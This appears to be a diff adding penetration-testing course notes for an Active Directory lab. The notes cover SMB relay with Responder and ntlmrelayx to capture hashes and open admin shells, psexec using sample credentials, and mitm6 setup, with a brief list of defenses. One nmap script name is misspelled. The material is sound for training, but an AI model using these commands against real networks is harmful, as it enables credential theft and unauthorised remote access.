@@ -76,3 +76,126 @@ DNS = On
 LDAP = On
 
 [*] Here Make Sure That SMB And HTTP Are "Turned Off"
+[*] Now Here, For Doing This Attack We Will Need Another Tool Called ntlmrelayx:
+
+https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py
+
+[*] Lab Update
+
+[*] So For The Attack To Run Successfully, We Will Need To Do A Quick Lab Change. That Is: We Will Have To Turn On Network Discovery
+[*] For That Open Quick Access And Click On The Network Folder On The Left
+[*] Hit Ok And There Should Be A Message On Top. In That Message Click On: Click To Change; And Turn On Network Discovery And File Sharing
+[*] Do This To Both The Windows Machines
+
+[*] Finding If The Targets Are Vulnerable To This Attack
+
+[*] For This, You Can Use NMAP Or Nessus. We Will Use Nmap Here
+[*] Command:
+
+nmap --script=smb2-secuity-mode.nse -p445 <Target IP>/24
+
+[*] In The Result, We Clearly See That Message Signing Is Enabled On Our Server, But In Both The Machines, It Is Enabled But Not Required(We Can Still Do The Attack)! Success!
+[*] Now We Will Make A Text File, We Will Add IP Address Of One Of Our Target. 
+
+[*] Attacking:
+
+[*] Note: In Order To Run This Attack, We Will Have To Attack The User Who Was Admin On Both The User Devices
+[*] Again, Check That The Responder Changes Are Made
+[*] Lets Run Responder:
+
+responder -I <Interface> -rdwv
+
+[*] Now Lets Relay Using ntlmrelayx
+
+ntlmrelayx.py -tf <File With Target IP> -smb2support
+
+[*] Now, Like Before Head To The Victim Machine(Of Which The IP In The File Is) And In The File Explorer Type: \\<Attacker IP>
+[*] You May Get An Error On The Windows Machine But, On Our Kali Machine, We Get The Hashes!
+
+[*] Improved
+
+[*] Here We Have To Gain A Shell But We Have To Make Only One Change! 
+[*] Run The Same Above Steps But In The ntlmrelayx.py Add An Extra Switch
+
+ntlmrelayx.py -tf <File With Target IP> -smb2support -i
+
+[*] Now Here Some Information Should Be Displayed When The Connection Occurs
+[*] Now Lets Netcat By Using The Information We Got(There Should Be A Line Where It Says SMB Shell Started Or Something Like That)
+[*] Example:
+
+nc 127.0.0.1 11000
+
+[*] We Got An SMB Share Shell!
+[*] Lets Test It. 
+
+shares
+
+[*] This Will Display The Available Shares
+[*] And 
+
+use
+
+[*] Will Help Use Migrate To A Share
+
+use ADMIN$
+
+[*] We Are Admin
+
+use C$
+
+[*] We Are In The C Drive!
+
+[*] We Can Also Add A Switch: -c; Using Which We Can Run Commands(I Mean, A Reverse Shell!)
+
+[*] Defenses:
+
+[+] Enable SMB Signing On All Devices
+[+] Disable NTLM Authentication On Network
+[+] Account Tiering
+[+] Local Admin Restriction
+
+[*] Gaining Shell By Using The Information That We Gained Till Now
+
+[*] As We Have Credentials And SMB Is Open, Let's Get A Shell Using psexec. (Already Used In Mid-Course Capstone)
+
+psexec.py <Domian>.local/<Username>:<Password>@<Target Ip>
+
+[*] Example
+
+psexec.py MARVEL.local/fcastle:Password1@192.168.57.141
+
+[*] Tip: First Try Using wmiexec And smbexec Before Running psexec
+
+[*] IPv6 Attacks
+
+[*] For This Attack, We Will MITM6
+
+https://github.com/fox-it/mitm6
+
+[*] Installation
+
+pip3 install .
+
+[*] Wait A Second
+
+[*] Setting Up LDAPS(On Our Server)
+
+1. Open Server Manager
+2. Click On Manage
+3. Click On Add Roles And Features
+4. Click Next 3 Times
+5. From The List, Select Active Directory Certificate Services
+6. Select Add Features
+7. Click Next 4 Times
+8. And Select The Option: Restart The Destination Server Automatically If Requires
+9. Click Yes
+10. Hit Install
+11. Close The Window After Installation
+12. Click On The Flag With The Alert Symbol And Click On Configure Active Directory Certificate Services..
+13. Click On Next
+14. Click On Certificate Authority
+15. Hit Enter 6 Times(If Shown, Select SHA256 From The List)
+16. In The Time Period, Change It To 99 Years
+17. Hit Next 2 Times
+18. Click Configure
+19. Reboot The Server
